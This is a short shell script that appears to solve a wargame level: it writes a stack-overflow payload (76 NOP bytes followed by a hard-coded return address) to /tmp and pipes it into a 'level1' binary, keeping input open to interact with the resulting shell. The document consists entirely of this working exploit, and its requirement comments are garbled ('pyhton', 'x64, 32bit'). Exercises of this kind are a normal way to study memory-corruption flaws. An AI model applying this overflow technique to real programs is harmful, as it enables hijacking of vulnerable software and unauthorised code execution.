#!/bin/sh

# REQUIREMENTS:
# pyhton must be installed
# must be on a x64, 32bit linux architecture.

ADDRESS_LITTLE_ENDIAN="\x44\x84\x04\x08"

echo $(python -c "print('\x90' * 76 + '$ADDRESS_LITTLE_ENDIAN')") > /tmp/payload

cat /tmp/payload - | /home/user/level1/level1
rm /tmp/payload